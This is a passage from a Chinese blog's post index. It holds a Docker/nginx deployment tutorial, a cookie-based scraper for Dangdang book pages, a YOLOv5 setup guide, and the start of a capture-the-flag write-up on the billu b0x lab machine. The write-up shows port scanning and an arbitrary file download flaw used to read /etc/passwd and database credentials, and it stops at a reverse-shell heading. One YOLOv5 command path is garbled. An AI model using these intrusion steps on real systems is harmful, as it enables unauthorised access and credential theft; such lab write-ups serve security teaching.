X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这里是监听<code>/prod-api</code>请求并转发到后端的8080端口，所以不要修改你前端的<code>main.ts</code>文件：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = (<span class="string">&quot;http://your_sever_public_ip/prod-api&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>最后执行以下命令来部署nginx：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 \</span><br><span class="line">  -v /opt/ruoyi/nginx/nginx.conf:/etc/nginx/nginx.conf -v /opt/ruoyi/nginx/html:/usr/share/nginx/html \</span><br><span class="line">  --name your_nginx_container_name --network your_network_name \</span><br><span class="line">  nginx:latest</span><br></pre></td></tr></table></figure></li></ul><p>输入<code>docker ps</code>来查看服务：</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/70d45e59357c2f555d9c4f088687f0d9.png" alt="查看nginx服务"></p><p>至此，三个服务都已部署成功。</p><h2 id="五、一些踩过的坑"><a href="#五、一些踩过的坑" class="headerlink" title="五、一些踩过的坑"></a>五、一些踩过的坑</h2><ul><li><p>jar包运行失败或者是找不到主类。运行失败可能是jdk版本的问题，如果是找不到主类的话检查后端的<code>pom.xml</code>文件，为主类添加<code>&lt;skip&gt;</code>配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.example.smartpricing.SmartPricingApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">skip</span>&gt;</span>false<span class="tag">&lt;/<span class="name">skip</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时本地可以通过命令<code>java -jar your_jar_name.jar</code>来检查jar包能否正常运行，部署完后也可以通过命令<code>docker logs your_backend_container_name</code>来检查后端是否已经正常启动。</p></li><li><p>http访问公网ip显示无法访问此页面。检查你的云服务器是否开放了80(http)端口，如果没有将其开放即可。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/8d67382ae1d5d4442d5a010d6a840be7.png" alt="检查http端口"></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> 教程 </tag>
            
            <tag> Docker </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当当网数据爬取脚本</title>
      <link href="/post/7d2474f8.html"/>
      <url>/post/7d2474f8.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：因为这学期上了软院传奇屎课软工2，为了更好地展示大作业(图书商城)的效果，故写了个爬虫爬取了当当网的数据。</p><h2 id="一、获取Cookie"><a href="#一、获取Cookie" class="headerlink" title="一、获取Cookie"></a>一、获取Cookie</h2><p>因为不登陆的话当当网是有访问次数限制的，所以需要获取个人Cookie来维持登录状态。Cookie的获取非常简单，只需要在浏览器登录当当网后按下f12打开开发者工具，选择网络后再刷新一下页面，选择其中某一个元素就能查看到Cookie。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/e9f5d94557761a286babeecadcfdbbb4.png" alt="获取cookie"></p><p>相关的登陆代码大致如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    <span class="variable language_">self</span>.headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="variable language_">self</span>.session.headers.update(<span class="variable language_">self</span>.headers)   </span><br><span class="line">    <span class="comment"># 直接从cookie.txt加载Cookie</span></span><br><span class="line">    <span class="variable language_">self</span>.load_cookies_from_file()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_cookies_from_file</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从cookie.txt文件加载Cookie数据&quot;&quot;&quot;</span></span><br><span class="line">    cookie_file = <span class="string">&quot;cookie.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(cookie_file):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(cookie_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                cookie_str = f.read().strip()</span><br><span class="line">                <span class="keyword">if</span> cookie_str:</span><br><span class="line">                    <span class="comment"># 解析Cookie字符串并添加到会话中</span></span><br><span class="line">                    cookies = &#123;&#125;</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> cookie_str.split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                        <span class="keyword">if</span> item:</span><br><span class="line">                            item = item.strip()</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">                                key, value = item.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                                cookies[key] = value</span><br><span class="line">                        </span><br><span class="line">                    <span class="comment"># 将Cookie添加到会话</span></span><br><span class="line">                    <span class="variable language_">self</span>.session.cookies.update(cookies)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;已从cookie.txt加载Cookie数据&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;cookie.txt文件为空&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;加载Cookie数据失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到cookie.txt文件，将使用无登录状态访问&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;提示: 请从浏览器开发者工具中复制Cookie并保存到同目录的cookie.txt文件中&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="二、分析网页元素"><a href="#二、分析网页元素" class="headerlink" title="二、分析网页元素"></a>二、分析网页元素</h2><p>这步更简单，只需要分析网页结构即可<del>(剩下的交给ai)</del>。下面以爬某个商品的图片链接来说明：打开商品详情页面，对准商品图片按下鼠标右键，在选项框里选择“检查”，</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/2025-06-25%20181702.png" alt="检查"></p><p>然后在弹出的开发者工具中就会显示图片对应的网页结构，</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/dd74f6e7de8e2a17d0d90a7967218603.png" alt="图片网页结构"></p><p>从html文件中可以看到商品图片对应的模块是id为<code>largePic</code>的<code>img</code>块，我们可以给ai描述为“从id为largePic的img块中获取src的内容，并在链接前面添加‘https:’。”</p><p>获取链接的核心代码如下(使用了<code>BeautifulSoup</code>包)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cover_elem = soup.select_one(<span class="string">&#x27;img#largePic&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> cover_elem <span class="keyword">and</span> cover_elem.has_attr(<span class="string">&#x27;src&#x27;</span>):</span><br><span class="line">    src = cover_elem[<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">    product_info[<span class="string">&quot;cover&quot;</span>] = <span class="string">f&quot;https:<span class="subst">&#123;src&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>其余的相关信息也是依法炮制，比如要获取标题信息就对标题进行检查，要获取作者信息就对准作者信息进行检查，这里给出我获取的一些商品信息的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_product_info</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从商品页面提取详细信息&quot;&quot;&quot;</span></span><br><span class="line">    soup = <span class="variable language_">self</span>.fetch_page(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> soup:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 初始化商品信息字典</span></span><br><span class="line">    product_info = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;rate&quot;</span>: <span class="number">6</span>,  <span class="comment"># 根据要求默认为6</span></span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cover&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;specifications&quot;</span>: [</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;作者&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;副标题&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,  <span class="comment"># 根据要求设置为空字符串</span></span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;ISBN&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;帧装&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;页数&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,  <span class="comment"># 根据要求设置为空字符串</span></span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;出版社&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;item&quot;</span>: <span class="string">&quot;出版日期&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># ①提取title</span></span><br><span class="line">    title_elem = soup.select_one(<span class="string">&#x27;div.name_info h1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> title_elem <span class="keyword">and</span> title_elem.has_attr(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">        full_title = title_elem[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        <span class="comment"># 确保full_title是字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(full_title, <span class="built_in">list</span>):</span><br><span class="line">            full_title = <span class="string">&#x27;&#x27;</span>.join(full_title)</span><br><span class="line">            <span class="comment"># 处理title，截取到第一个&#x27;（&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;（&#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27;（&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;(&#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27;(&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">in</span> full_title:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            product_info[<span class="string">&quot;title&quot;</span>] = full_title</span><br><span class="line">    <span class="comment"># ②提取price</span></span><br><span class="line">    price_elem = soup.select_one(<span class="string">&#x27;p#dd-price&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> price_elem:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 提取数字部分</span></span><br><span class="line">            price_text = <span class="string">&#x27;&#x27;</span>.join(c <span class="keyword">for</span> c <span class="keyword">in</span> price_elem.text <span class="keyword">if</span> c.isdigit() <span class="keyword">or</span> c == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            product_info[<span class="string">&quot;price&quot;</span>] = <span class="built_in">float</span>(price_text)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># ④提取description</span></span><br><span class="line">    desc_elem = soup.select_one(<span class="string">&#x27;span.head_title_name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> desc_elem <span class="keyword">and</span> desc_elem.has_attr(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">        product_info[<span class="string">&quot;description&quot;</span>] = desc_elem[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    <span class="comment"># ⑤提取cover</span></span><br><span class="line">    cover_elem = soup.select_one(<span class="string">&#x27;img#largePic&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cover_elem <span class="keyword">and</span> cover_elem.has_attr(<span class="string">&#x27;src&#x27;</span>):</span><br><span class="line">        src = cover_elem[<span class="string">&#x27;src&#x27;</span>]</span><br><span class="line">        product_info[<span class="string">&quot;cover&quot;</span>] = <span class="string">f&quot;https:<span class="subst">&#123;src&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># ⑦提取作者、出版社、出版日期</span></span><br><span class="line">    messbox = soup.select_one(<span class="string">&#x27;div.messbox_info&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> messbox:</span><br><span class="line">        spans = messbox.select(<span class="string">&#x27;span&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">0</span>:</span><br><span class="line">            author_elem = spans[<span class="number">0</span>].select_one(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> author_elem:</span><br><span class="line">                product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">0</span>][<span class="string">&quot;value&quot;</span>] = author_elem.text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">1</span>:</span><br><span class="line">            publisher_elem = spans[<span class="number">1</span>].select_one(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> publisher_elem:</span><br><span class="line">                product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">5</span>][<span class="string">&quot;value&quot;</span>] = publisher_elem.text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">2</span>:</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">6</span>][<span class="string">&quot;value&quot;</span>] = spans[<span class="number">2</span>].text.split(<span class="string">&#x27;:&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="comment"># ⑨提取ISBN和帧装</span></span><br><span class="line">    key_ul = soup.select_one(<span class="string">&#x27;ul.key.clearfix&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_ul:</span><br><span class="line">        lis = key_ul.select(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(lis) &gt; <span class="number">2</span>:  <span class="comment"># 第三个li为帧装</span></span><br><span class="line">            framing_text = lis[<span class="number">2</span>].text.strip()</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">3</span>][<span class="string">&quot;value&quot;</span>] = framing_text.split(<span class="string">&#x27;：&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(lis) &gt; <span class="number">4</span>:  <span class="comment"># 第五个li为ISBN</span></span><br><span class="line">            isbn_text = lis[<span class="number">4</span>].text.strip()</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">2</span>][<span class="string">&quot;value&quot;</span>] = isbn_text.split(<span class="string">&#x27;：&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> product_info</span><br></pre></td></tr></table></figure><p>一点儿吐槽：<del>ai是真好用啊，感觉我不如ai一根。</del>当当网的网页结构是真的丑，甚至每本书各自的标签爬下来和主页的标签分类对不上，还要手动调整，也是被整无语了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yolov5环境配置教程</title>
      <link href="/post/9807c50b.html"/>
      <url>/post/9807c50b.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本学期因为大创需要使用yolov模型来进行相关的工作，故记录如下。使用的系统为Ubuntu18.04.</p><h2 id="1-安装Anaconda"><a href="#1-安装Anaconda" class="headerlink" title="1.安装Anaconda"></a>1.安装Anaconda</h2><ul><li><p>访问<a href="https://repo.anaconda.com/archive/Anaconda3-2024.10-1-Linux-x86_64.sh">Anaconda官网下载合适版本</a>。</p></li><li><p>导航到下载目录：使用cd命令导航到下载目录。例如，如果下载文件在Downloads目录下：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads</span><br></pre></td></tr></table></figure></li><li><p>运行安装脚本：使用bash命令运行下载的安装脚本：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash Anaconda3-2024.10-1-Linux-x86_64.sh</span><br></pre></td></tr></table></figure></li><li><p>阅读并接受许可协议：在安装过程中，会显示许可协议，按q键跳过，然后输入yes接受协议。</p></li><li><p>选择安装路径：默认安装路径是&#x2F;home&#x2F;your_username&#x2F;anaconda3，可以按Enter接受默认路径，或者输入其他路径。</p></li><li><p>初始化Anaconda：安装完成后，系统会提示是否初始化Anaconda，输入yes以启用。</p></li><li><p>更新环境变量：安装完成后，关闭并重新打开终端，或者运行以下命令使环境变量生效：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>验证安装：在终端中输入以下命令，检查Anaconda是否安装成功：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure><p>  如果安装成功，会显示Anaconda的版本号。</p></li><li><p>创建虚拟环境：打开终端，输入以下命令创建一个名为yolov5的虚拟环境，并指定Python版本为3.12(官方的文档里说明的是python版本大于等于3.8.0)：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n yolov5 python=3.12</span><br><span class="line">conda activate yolov5</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-安装pytorch"><a href="#2-安装pytorch" class="headerlink" title="2.安装pytorch"></a>2.安装pytorch</h2><ul><li><p>安装PyTorch(官方的文档里说明的是pytorch版本大于等于1.8)：如果你可以直连n卡(比如真机，双系统和使用了kvm虚拟化的wsl)，下载GPU版本的pytorch：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio pytorch-cuda=11.7 -c pytorch -c nvidia</span><br></pre></td></tr></table></figure><p>  否则使用CPU版本的pytorch：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio cpuonly -c pytorch</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-安装相关依赖"><a href="#3-安装相关依赖" class="headerlink" title="3.安装相关依赖"></a>3.安装相关依赖</h2><ul><li><p>安装依赖：在YOLOv5项目根目录下，运行以下命令安装所有必需的Python包：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-验证安装"><a href="#4-验证安装" class="headerlink" title="4.验证安装"></a>4.验证安装</h2><ul><li><p>下载预训练模型：从YOLOv5的GitHub发布页面下载预训练模型，并将其放置在YOLOv5项目目录下。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/ultralytics/yolov5/releases/download/v6.2/yolov5s.pt</span><br></pre></td></tr></table></figure></li><li><p>验证安装：运行一个简单的推理脚本来验证YOLOv5是否正确安装：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python detect.py --<span class="built_in">source</span> ./datahttps://my-github-blog.oss-cn-hangzhou.aliyuncs.coms/ --weights ./yolov5s.pt</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-相关的官方链接"><a href="#5-相关的官方链接" class="headerlink" title="5.相关的官方链接"></a>5.相关的官方链接</h2><ul><li>源仓库的github链接：<a href="https://github.com/ultralytics/yolov5">yolov5源仓库</a></li><li>官方教程文档：<a href="https://docs.ultralytics.com/zh/yolov5/">yolov5教程</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 教程 </tag>
            
            <tag> yolov </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实战billu b0x打靶思路</title>
      <link href="/post/b858f09.html"/>
      <url>/post/b858f09.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：思路不同于cy老师上课讲的，故在此记录一下。</p><h2 id="一、扫描端口"><a href="#一、扫描端口" class="headerlink" title="一、扫描端口"></a>一、扫描端口</h2><p>首先还是尝试非常经典的扫描端口，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#查找靶机ip</span></span><br><span class="line">nmap -p- 10.0.2.13 -sV –min-rate 50000 –min-hostgroup 100 <span class="comment">#查找靶机暴露的端口以及其具体信息</span></span><br></pre></td></tr></table></figure><p>发现结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/f85375a98414cad4082aca7e49362cb1.png" alt="靶机ip"></p><p>尝试寻找相应的漏洞后(使用<code>searchsploit</code>命令)，没有发现可利用的漏洞，故进行到下一步。</p><h2 id="二、尝试破解登录"><a href="#二、尝试破解登录" class="headerlink" title="二、尝试破解登录"></a>二、尝试破解登录</h2><ul><li>首先尝试使用seclist中提供的目录来进行爆破，但是因为burpsuite没开会员，等待时间非常长，故选择放弃。</li><li>很容易想到经典的目录搜索<code>dirsearch -u 10.0.2.13</code>来寻找泄露的信息，发现了非常多的可用网页：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/94eeb0452789faa77ff51f5e92fa44ef.png" alt="目录搜索"><br>故对各网页进行尝试，在访问<code>10.0.2.13/test</code>这个网页的时候发现了任意文件下载漏洞，先尝试GET类型的请求方法来进行尝试：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/50f3881561803610a03c3027d50698ea.png" alt="test.php"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/bb9faf6ca59c95d0f8865a5fe1d1bd61.png" alt="GET1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/d898310f77c3b2c5c622fb872d9b6cbb.png" alt="GET2"><br>发现没有返回结果，故利用burpsuite工具来尝试修改请求类型，将GET请求转化为POST请求，得到如下结果：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/58b9fe731240af6e6b48f5a7af70aab9.png" alt="POST1"><br>发现成功得到了<code>/etc/passwd</code>里的内容，利用这个工具去查看前面发现的网页的内容，很“幸运”地发现了<code>/c</code>网页里的疑似数据库相关的信息：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/a10a8561bfe5aa0eaf02c275bf4be1df.png" alt="POST2"><br>将数据库和密码输入到<code>10.0.2.13/phpmy</code>，发现成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/3279a1e20775411b56c848434018a9d1.png" alt="数据库登录"><br>在phpmy网页中的auth一栏下发现了疑似网页的登录信息，将用户名和密码输入10.0.2.13这个网页中并发现能成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/940af7e60576e421cc8b4bc1605911cb.png" alt="网页登陆1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/03c42f4b0972ddddbb21a4b6b8a6dd38.png" alt="网页登陆2"></li></ul><h2 id="三、尝试反弹shell"><a href="#三、尝试反弹shell" class="headerlink" 